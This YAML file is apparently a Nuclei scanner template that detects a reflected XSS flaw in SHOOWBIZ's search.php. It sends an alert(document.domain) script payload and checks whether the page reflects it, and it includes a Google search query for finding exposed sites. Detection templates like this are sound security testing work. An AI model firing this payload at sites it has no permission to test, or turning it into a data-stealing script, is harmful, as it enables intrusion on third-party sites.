id: shoowbiz-xss

info:
  name: SHOOWBIZ - 跨站脚本漏洞
  author: r3Y3r53
  severity: medium
  description: SHOOWBIZ - 跨站脚本 存在跨站脚本漏洞。该模板通过构造恶意输入并检查响应回显或执行特征，验证目标是否会在浏览器上下文中执行注入脚本。
  reference:
    - https://www.exploitalert.com/view-details.html?id=36000
  metadata:
    verified: true
    max-request: 1
    google-query: inurl:"search.php?q="
  tags: shoowbiz,xss,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/search.php?q=%3CScRipT%3Ealert(document.domain);%3C/ScRipT%3E"

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(content_type, "text/html")'
          - 'contains(body, "<ScRipT>alert(document.domain);</ScRipT>")'
          - 'contains(body, "Search result in")'
        condition: and
